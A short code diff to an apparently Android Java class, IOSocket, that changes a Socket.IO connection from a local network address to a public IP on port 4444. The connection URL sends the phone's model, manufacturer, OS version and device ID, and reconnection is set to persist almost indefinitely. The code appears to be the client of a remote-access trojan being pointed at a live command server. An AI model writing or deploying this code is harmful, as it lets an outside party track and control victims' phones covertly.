@@ -30,7 +30,7 @@ public class IOSocket {
             opts.reconnectionDelay = 5000;
             opts.reconnectionDelayMax = 999999999;
             String params = URLEncoder.encode(Build.MANUFACTURER, "UTF-8");
-            ioSocket = IO.socket("http://192.168.43.157/?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+params+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
+            ioSocket = IO.socket("http://128.199.228.36:4444/?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+params+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
         } catch (URISyntaxException | UnsupportedEncodingException e) {
             e.printStackTrace();
         }
